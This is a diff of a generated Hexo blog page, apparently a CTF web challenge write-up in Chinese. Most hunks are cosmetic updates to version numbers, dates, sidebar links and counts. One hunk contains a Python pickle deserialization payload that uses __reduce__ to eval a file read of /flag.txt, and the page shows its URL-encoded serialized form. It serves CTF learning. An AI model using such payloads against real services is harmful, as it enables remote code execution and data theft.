@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
+<meta name="generator" content="Hexo 6.3.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/HeadPortrait-32x32.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/HeadPortrait-16x16.ico">
@@ -69,7 +69,7 @@
 <meta property="og:image" content="http://www.addx.top/2020/01/15/1Kun/14.png">
 <meta property="og:image" content="http://www.addx.top/2020/01/15/1Kun/1Kun%5Cemmm.jpg">
 <meta property="article:published_time" content="2020-01-15T09:22:15.000Z">
-<meta property="article:modified_time" content="2020-01-15T09:42:00.000Z">
+<meta property="article:modified_time" content="2021-09-10T10:26:13.519Z">
 <meta property="article:author" content="+×">
 <meta property="article:tag" content="CTFWEB">
 <meta name="twitter:card" content="summary">
@@ -135,7 +135,7 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">人生总有各种理由将一个人变成一个five!</p>
+        <p class="site-subtitle">D~DIDI~DIDIDI!!!!</p>
   </div>
 
   <div class="site-nav-toggle">
@@ -197,7 +197,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/HeadPortrait.png">
       <meta itemprop="name" content="+×">
-      <meta itemprop="description" content="您看！这里什么也没有!">
+      <meta itemprop="description" content="这里什么也没有!">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -214,10 +214,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-01-15 17:22:15 / Modified: 17:42:00" itemprop="dateCreated datePublished" datetime="2020-01-15T17:22:15+08:00">2020-01-15</time>
+              <time title="Created: 2020-01-15 17:22:15" itemprop="dateCreated datePublished" datetime="2020-01-15T17:22:15+08:00">2020-01-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-10 18:26:13" itemprop="dateModified" datetime="2021-09-10T18:26:13+08:00">2021-09-10</time>
+              </span>
 
           
 
@@ -264,7 +270,7 @@
 <p>这里的序列化参数become，发现其实在页面中有个隐藏输入框，是可以提交become参数的只要取消hidden属性就可以了</p>
 <p><img src="/2020/01/15/1Kun/13.png" alt="13"></p>
 <p>接下来生成一个payload,运行得到需要的become</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>
 
 <p><code> c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></p>
 <p><img src="/2020/01/15/1Kun/14.png" alt="14"><br><font color="#ffffff">突发觉得还是做一个沙雕快乐，毕竟只是个five啊</font><br><img src="/2020/01/15/1Kun/1Kun%5Cemmm.jpg" alt="emmm"></p>
@@ -360,21 +366,21 @@
     <img class="site-author-image" itemprop="image" alt="+×"
       src="/images/HeadPortrait.png">
   <p class="site-author-name" itemprop="name">+×</p>
-  <div class="site-description" itemprop="description">您看！这里什么也没有!</div>
+  <div class="site-description" itemprop="description">这里什么也没有!</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">72</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -388,19 +394,13 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://gorgias.me/" title="https:&#x2F;&#x2F;gorgias.me&#x2F;" rel="noopener" target="_blank">巨佬</a>
+          <a href="https://gorgias.me/" title="https:&#x2F;&#x2F;gorgias.me&#x2F;" rel="noopener" target="_blank">gorgias（我大哥的大哥，长发黑阔）</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="http://couplee.wang/" title="http:&#x2F;&#x2F;couplee.wang&#x2F;" rel="noopener" target="_blank">wnagzihxa1n</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.cnblogs.com/warrenryan" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;warrenryan" rel="noopener" target="_blank">WarrenRyan</a>
+          <a href="https://www.cnblogs.com/warrenryan" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;warrenryan" rel="noopener" target="_blank">WarrenRyan(我大哥，钢琴贼6)</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="http://rinbn.com/" title="http:&#x2F;&#x2F;rinbn.com&#x2F;" rel="noopener" target="_blank">Rinbn</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.imzj.top/" title="https:&#x2F;&#x2F;www.imzj.top&#x2F;" rel="noopener" target="_blank">imzj</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://pukrr.github.io/" title="https:&#x2F;&#x2F;pukrr.github.io&#x2F;" rel="noopener" target="_blank">pukrr</a>
@@ -409,16 +409,13 @@
           <a href="http://q0o0p.top/" title="http:&#x2F;&#x2F;q0o0p.top" rel="noopener" target="_blank">q0o0p</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="http://blog.immity.best/" title="http:&#x2F;&#x2F;blog.immity.best" rel="noopener" target="_blank">陈组长大人</a>
-        </li>
-        <li class="links-of-blogroll-item">
           <a href="https://www.cnblogs.com/wushengyang" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wushengyang" rel="noopener" target="_blank">PY</a>
         </li>
     </ul>
   </div>
 
       </div>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=431259256&auto=0&height=66"></iframe>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1496089152&auto=1&height=66"></iframe>
     </div>
   </aside>
   <div id="sidebar-dimmer"></div>
@@ -434,13 +431,13 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">+×</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v5.4.0
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v6.3.0
   </div>
   <span class="post-meta-divider">|</span>
   <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
